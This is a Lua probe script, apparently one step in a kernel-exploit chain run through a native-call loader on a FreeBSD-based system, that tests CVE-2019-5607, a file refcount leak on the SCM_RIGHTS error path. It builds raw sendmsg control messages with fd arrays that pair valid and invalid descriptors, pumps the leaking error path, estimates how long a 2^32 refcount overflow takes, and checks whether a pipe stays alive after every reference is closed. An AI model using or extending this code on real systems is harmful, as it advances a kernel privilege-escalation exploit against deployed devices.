-- CRASH_CLASS: LOW (non-blocking, no kernel writes, no threading)
-- PROBE 89b: CVE-2019-5607 gate test — error-path fhold leak
--
-- CVE-2019-5607 (FreeBSD SA-19:17.fd): unp_internalize() calls fhold() on
-- each fd in an SCM_RIGHTS array. If a LATER fd is invalid (EBADF), it returns
-- error WITHOUT calling fdrop() on the already-fhold'd fds. Confirmed in 13.60
-- Ghidra: fhold @ TEXT+0x53c5f2, no fdrop in 1772 bytes to error return.
--
-- Gate questions:
--   A. Does single-fd SCM_RIGHTS work? (baseline)
--   B. Does multi-fd [valid, 9999] SCM_RIGHTS return error? (error path reachable)
--   C. Is the valid fd unharmed after the error? (fhold happened)
--   D. Can we pump error-path sends at speed? (throughput for 2^32 overflow)
--   E. Refcount elevation evidence via normal sends + close + recv

print("=== PROBE 89b: CVE-2019-5607 GATE TEST ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function zero(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function canary()
    local ok, v = pcall(function() return N(native.fcall_with_rax(stub, 20)) end)
    return ok and v == pid
end

local F_SETFL = 4
local O_NONBLOCK = 4
local INVALID_FD = 9999

-- ============================================================
-- SCM_RIGHTS helpers (CMSG_DATA at +16 on 64-bit FreeBSD)
-- ============================================================

-- Send single fd via SCM_RIGHTS
local function scm_send_1(sock, fd_to_pass)
    local iov_buf = memory.alloc(8)
    memory.write_byte(iov_buf, 0x42)
    local iov = memory.alloc(16)
    wq(iov, uint64(N(iov_buf))); wq(iov + 8, uint64(1))
    local cmsg = memory.alloc(32); zero(cmsg, 32)
    wd(cmsg, 20)              -- cmsg_len = CMSG_LEN(4) = 16 + 4 = 20
    wd(cmsg + 4, 0xFFFF)      -- SOL_SOCKET
    wd(cmsg + 8, 1)           -- SCM_RIGHTS
    wd(cmsg + 16, fd_to_pass) -- CMSG_DATA offset 16
    local msg = memory.alloc(64); zero(msg, 64)
    wq(msg + 0x10, uint64(N(iov))); wd(msg + 0x18, 1)
    wq(msg + 0x20, uint64(N(cmsg))); wd(msg + 0x28, 24) -- CMSG_SPACE(4)=24
    return N(native.fcall_with_rax(stub, 28, sock, N(msg), 0))
end

-- Send 2 fds via SCM_RIGHTS: [fd1, fd2]
local function scm_send_2(sock, fd1, fd2)
    local iov_buf = memory.alloc(8)
    memory.write_byte(iov_buf, 0x42)
    local iov = memory.alloc(16)
    wq(iov, uint64(N(iov_buf))); wq(iov + 8, uint64(1))
    local cmsg = memory.alloc(32); zero(cmsg, 32)
    wd(cmsg, 24)              -- cmsg_len = CMSG_LEN(8) = 16 + 8 = 24
    wd(cmsg + 4, 0xFFFF)      -- SOL_SOCKET
    wd(cmsg + 8, 1)           -- SCM_RIGHTS
    wd(cmsg + 16, fd1)        -- fd[0] at CMSG_DATA+0
    wd(cmsg + 20, fd2)        -- fd[1] at CMSG_DATA+4
    local msg = memory.alloc(64); zero(msg, 64)
    wq(msg + 0x10, uint64(N(iov))); wd(msg + 0x18, 1)
    wq(msg + 0x20, uint64(N(cmsg))); wd(msg + 0x28, 24) -- CMSG_SPACE(8)=24
    return N(native.fcall_with_rax(stub, 28, sock, N(msg), 0))
end

-- Recv fd from SCM_RIGHTS
local function scm_recv(sock)
    local rbuf = memory.alloc(8)
    local riov = memory.alloc(16)
    wq(riov, uint64(N(rbuf))); wq(riov + 8, uint64(1))
    local rcm = memory.alloc(64); zero(rcm, 64)
    local rmsg = memory.alloc(64); zero(rmsg, 64)
    wq(rmsg + 0x10, uint64(N(riov))); wd(rmsg + 0x18, 1)
    wq(rmsg + 0x20, uint64(N(rcm))); wd(rmsg + 0x28, 64)
    local rr = N(native.fcall_with_rax(stub, 27, sock, N(rmsg), 0))
    if rr <= 0 then return -1 end
    local ctyp = rd(rcm + 8) or 0
    local fd = rd(rcm + 16) or 0
    if ctyp == 1 and fd > 0 and fd < 10000 then return fd end
    return -1
end

-- ============================================================
-- SECTION A: Single-fd SCM_RIGHTS baseline
-- ============================================================
print("--- A: SCM_RIGHTS BASELINE ---")

local sv = memory.alloc(8); wq(sv, uint64(0))
local sp = N(native.fcall_with_rax(stub, 135, 1, 1, 0, N(sv)))
local s0, s1 = rd(sv), rd(sv + 4)
print("  socketpair ret=" .. sp .. " [" .. (s0 or "?") .. "," .. (s1 or "?") .. "]")
if sp ~= 0 then print("FATAL: no socketpair"); return end

native.fcall_with_rax(stub, 92, s1, F_SETFL, O_NONBLOCK)

-- Create target pipe via create_pipe() (uses Lua loader builtin)
local p1, p2 = create_pipe()
local tgt_rd = N(p1)
local tgt_wr = N(p2)
native.fcall_with_rax(stub, 92, tgt_rd, F_SETFL, O_NONBLOCK)

-- Write marker
local mark = memory.alloc(8); wd(mark, 0xAAAA0001)
native.fcall_with_rax(stub, 4, tgt_wr, N(mark), 4)

print("  target pipe [" .. tgt_rd .. "," .. tgt_wr .. "]")

local sr = scm_send_1(s0, tgt_rd)
print("  scm_send_1(pipe_rd=" .. tgt_rd .. ") ret=" .. sr)

if sr <= 0 then
    print("  *** SCM_RIGHTS SEND FAILED — gate blocked ***")
    native.fcall_with_rax(stub, 6, tgt_rd); native.fcall_with_rax(stub, 6, tgt_wr)
    native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
    print("=== PROBE 89b ABORTED ==="); return
end

local recv_fd = scm_recv(s1)
print("  scm_recv → fd=" .. recv_fd)

if recv_fd > 0 then
    native.fcall_with_rax(stub, 92, recv_fd, F_SETFL, O_NONBLOCK)
    local rb = memory.alloc(8); wq(rb, uint64(0))
    local rn = N(native.fcall_with_rax(stub, 3, recv_fd, N(rb), 4))
    local rv = rd(rb) or 0
    print(string.format("  read(recv_fd): n=%d val=0x%X %s", rn, rv,
        rv == 0xAAAA0001 and "*** BASELINE OK ***" or "WRONG"))
    native.fcall_with_rax(stub, 6, recv_fd)
end

native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
print("")
if not canary() then print("*** DEAD after A ***"); return end

-- ============================================================
-- SECTION B: Multi-fd [valid, INVALID] — error path test
-- ============================================================
print("--- B: ERROR PATH [valid, 9999] ---")

wq(sv, uint64(0))
sp = N(native.fcall_with_rax(stub, 135, 1, 1, 0, N(sv)))
s0, s1 = rd(sv), rd(sv + 4)
native.fcall_with_rax(stub, 92, s1, F_SETFL, O_NONBLOCK)

-- [valid, 9999] — should fail with EBADF on the second fd
local r2 = scm_send_2(s0, tgt_rd, INVALID_FD)
print("  scm_send_2([" .. tgt_rd .. ", 9999]) ret=" .. r2)

if r2 > 0 then
    print("  UNEXPECTED: send succeeded with invalid fd!")
    print("  kernel might not validate individual fds in array")
    -- Drain whatever was sent
    local dfd = scm_recv(s1)
    if dfd > 0 then native.fcall_with_rax(stub, 6, dfd) end
    dfd = scm_recv(s1)
    if dfd > 0 then native.fcall_with_rax(stub, 6, dfd) end
elseif r2 == -1 then
    print("  *** ERROR PATH REACHED — sendmsg returned -1 ***")
    -- Verify valid fd is still usable
    local check_sr = scm_send_1(s0, tgt_rd)
    local check_fd = -1
    if check_sr > 0 then check_fd = scm_recv(s1) end
    if check_fd > 0 then
        native.fcall_with_rax(stub, 92, check_fd, F_SETFL, O_NONBLOCK)
        local rb = memory.alloc(8); wq(rb, uint64(0))
        -- Write fresh marker
        wd(mark, 0xBBBB0002)
        native.fcall_with_rax(stub, 4, tgt_wr, N(mark), 4)
        local rn = N(native.fcall_with_rax(stub, 3, check_fd, N(rb), 4))
        local rv = rd(rb) or 0
        print(string.format("  post-error fd check: n=%d val=0x%X %s", rn, rv,
            rv == 0xBBBB0002 and "*** FD SURVIVED ERROR ***" or "problem"))
        native.fcall_with_rax(stub, 6, check_fd)
    else
        print("  post-error send/recv failed — fd may be corrupted")
    end
end

-- Also test [9999, valid] — invalid FIRST
local r3 = scm_send_2(s0, INVALID_FD, tgt_rd)
print("  scm_send_2([9999, " .. tgt_rd .. "]) ret=" .. r3)

native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
print("")
if not canary() then print("*** DEAD after B ***"); return end

-- ============================================================
-- SECTION C: Error-path pump throughput
-- ============================================================
print("--- C: ERROR PATH PUMP THROUGHPUT ---")

wq(sv, uint64(0))
sp = N(native.fcall_with_rax(stub, 135, 1, 1, 0, N(sv)))
s0, s1 = rd(sv), rd(sv + 4)

-- Pump [tgt_rd, 9999] sends — all should fail, each potentially leaking 1 fhold
local PUMP_N = 1000
local pump_ok = 0
local pump_fail = 0
local pump_crash = 0

-- Timestamp via gettimeofday
local tv0 = memory.alloc(16); zero(tv0, 16)
native.fcall_with_rax(stub, 116, N(tv0), 0) -- gettimeofday
local sec0 = N(rq(tv0) or uint64(0))
local usec0 = N(rq(tv0 + 8) or uint64(0))

for i = 1, PUMP_N do
    local ok, ret = pcall(function()
        return scm_send_2(s0, tgt_rd, INVALID_FD)
    end)
    if not ok then
        pump_crash = pump_crash + 1
        if pump_crash >= 3 then break end
    elseif ret == -1 then
        pump_fail = pump_fail + 1
    else
        pump_ok = pump_ok + 1
    end
end

local tv1 = memory.alloc(16); zero(tv1, 16)
native.fcall_with_rax(stub, 116, N(tv1), 0)
local sec1 = N(rq(tv1) or uint64(0))
local usec1 = N(rq(tv1 + 8) or uint64(0))

local elapsed_us = (sec1 - sec0) * 1000000 + (usec1 - usec0)
local rate = 0
if elapsed_us > 0 then rate = math.floor(PUMP_N * 1000000 / elapsed_us) end

print(string.format("  %d iterations: ok=%d fail=%d crash=%d", PUMP_N, pump_ok, pump_fail, pump_crash))
print(string.format("  elapsed: %d us (%.1f ms)", elapsed_us, elapsed_us / 1000))
print(string.format("  rate: %d sends/sec", rate))

if pump_fail == PUMP_N then
    print("  *** ALL sends returned -1 (error path consistently triggered) ***")
    if rate > 0 then
        local time_4g = math.floor(4294967296 / rate)
        print(string.format("  time to pump 2^32: ~%d seconds (~%.1f hours)",
            time_4g, time_4g / 3600))
        if rate >= 10000 then
            print("  *** FEASIBLE: overflow reachable in hours ***")
        end
    end
end

native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
print("")
if not canary() then print("*** DEAD after C ***"); return end

-- ============================================================
-- SECTION D: Normal-path refcount + hold verification
-- ============================================================
print("--- D: NORMAL SCM_RIGHTS REFCOUNT ---")

wq(sv, uint64(0))
sp = N(native.fcall_with_rax(stub, 135, 1, 1, 0, N(sv)))
s0, s1 = rd(sv), rd(sv + 4)
native.fcall_with_rax(stub, 92, s1, F_SETFL, O_NONBLOCK)

-- Pump 20 successful SCM_RIGHTS sends (refcount += 20 via fhold)
local HOLD_N = 20
local hold_ok = 0
for i = 1, HOLD_N do
    local ret = scm_send_1(s0, tgt_rd)
    if ret > 0 then hold_ok = hold_ok + 1 else break end
end
print("  pumped " .. hold_ok .. " successful SCM_RIGHTS sends")

-- Close original pipe read fd
native.fcall_with_rax(stub, 6, tgt_rd)
print("  closed tgt_rd=" .. tgt_rd)

-- Receive all held fds — each is a dup kept alive by fhold
local held = {}
for i = 1, hold_ok do
    local fd = scm_recv(s1)
    if fd > 0 then
        native.fcall_with_rax(stub, 92, fd, F_SETFL, O_NONBLOCK)
        held[#held + 1] = fd
    else
        break
    end
end
print("  recovered " .. #held .. " held fds")

-- Verify each held fd is the original pipe (alive after original close!)
local alive_count = 0
for i, fd in ipairs(held) do
    wd(mark, 0xDD000000 + i)
    native.fcall_with_rax(stub, 4, tgt_wr, N(mark), 4)
    local rb = memory.alloc(8); wq(rb, uint64(0))
    local rn = N(native.fcall_with_rax(stub, 3, fd, N(rb), 4))
    local rv = rd(rb) or 0
    if rn > 0 and rv == (0xDD000000 + i) then
        alive_count = alive_count + 1
    end
    if i <= 3 then
        print(string.format("  held[%d] fd=%d: read n=%d val=0x%X %s",
            i, fd, rn, rv,
            (rn > 0 and rv == (0xDD000000 + i)) and "ALIVE" or "problem"))
    end
end
if #held > 3 then print("  ... (" .. (alive_count - 3) .. " more alive)") end
print("  total alive: " .. alive_count .. "/" .. #held)

if alive_count == #held and alive_count > 0 then
    print("  *** fhold() CONFIRMED reachable — refs kept pipe alive after close ***")
end

-- Cleanup
for _, fd in ipairs(held) do native.fcall_with_rax(stub, 6, fd) end
native.fcall_with_rax(stub, 6, tgt_wr)
native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
print("")

-- ============================================================
-- SECTION E: Error-path leak evidence
-- ============================================================
print("--- E: ERROR PATH LEAK EVIDENCE ---")

-- New socketpair + new pipe for clean state
wq(sv, uint64(0))
sp = N(native.fcall_with_rax(stub, 135, 1, 1, 0, N(sv)))
s0, s1 = rd(sv), rd(sv + 4)
native.fcall_with_rax(stub, 92, s1, F_SETFL, O_NONBLOCK)

local ep1, ep2 = create_pipe()
local efd = N(ep1)
local ewr = N(ep2)
native.fcall_with_rax(stub, 92, efd, F_SETFL, O_NONBLOCK)

-- Also dup the pipe to keep a second known reference
local edup = N(native.fcall_with_rax(stub, 41, efd)) -- dup(efd)
print("  pipe rd=" .. efd .. " wr=" .. ewr .. " dup=" .. edup)

-- Pump error-path sends: [efd, 9999] × 50
local epump = 0
for i = 1, 50 do
    local ret = scm_send_2(s0, efd, INVALID_FD)
    if ret == -1 then epump = epump + 1 end
end
print("  error-path sends: " .. epump)

-- Now close BOTH known references
native.fcall_with_rax(stub, 6, efd)
native.fcall_with_rax(stub, 6, edup)
print("  closed efd=" .. efd .. " and dup=" .. edup)

-- If 50 fholds leaked, the pipe struct file has refcount=50
-- It's alive in kernel but unreachable from userland
-- Write to write-end to see if it accepts data (pipe buffer exists if struct alive)
wd(mark, 0xEEEE0005)
local wn = N(native.fcall_with_rax(stub, 4, ewr, N(mark), 4))
print("  write(pipe_wr) after close(rd+dup): ret=" .. wn)

if wn > 0 then
    print("  *** WRITE SUCCEEDED — pipe buffer still exists ***")
    print("  *** This means struct file was NOT freed despite closing all userland refs ***")
    print("  *** CVE-2019-5607 fhold LEAK CONFIRMED ***")

    -- Further: write more to see how much buffer space is available
    local total = wn
    for i = 1, 100 do
        local n = N(native.fcall_with_rax(stub, 4, ewr, N(mark), 4))
        if n <= 0 then break end
        total = total + n
    end
    print("  pipe buffer capacity: " .. total .. " bytes (struct file alive)")
elseif wn == -1 then
    print("  write failed — pipe struct was freed (no leak, or bug is patched)")
    print("  CVE-2019-5607 may NOT be exploitable on 14.10")
end

native.fcall_with_rax(stub, 6, ewr)
native.fcall_with_rax(stub, 6, s0); native.fcall_with_rax(stub, 6, s1)
print("")

-- Final canary
print("canary: " .. (canary() and "ALIVE" or "DEAD"))
print("=== PROBE 89b COMPLETE ===")
